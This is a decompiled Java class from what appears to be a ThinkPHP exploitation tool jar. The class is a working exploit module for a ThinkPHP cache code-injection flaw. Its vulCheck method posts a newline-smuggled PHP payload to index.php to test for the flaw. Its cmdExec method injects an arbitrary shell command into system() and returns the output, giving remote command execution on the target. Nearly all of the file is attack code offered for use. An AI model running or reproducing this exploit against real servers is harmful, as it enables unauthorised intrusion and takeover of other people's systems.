/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_cache
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 15 */     url = url + "/index.php/Home/Index/index.html";
/* 16 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 17 */     Response response = HttpTool.post(url, "a3=%0d%0avar_dump(11111);%0d%0a//", this.property);
/* 18 */     if (response.getText().contains("11111")) {
/* 19 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 20 */       return this.results;
/*    */     } 
/* 22 */     if (response.getError() != null) {
/* 23 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 24 */       return this.results;
/*    */     } 
/* 26 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 27 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 32 */     url = url + "/index.php/Home/Index/index.html";
/* 33 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 34 */     Response response = HttpTool.post(url, "a3=%0d%0asystem(\"" + cmd + "\");%0d%0a//", this.property);
/* 35 */     this.results = response.getText();
/* 36 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 41 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_cache.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */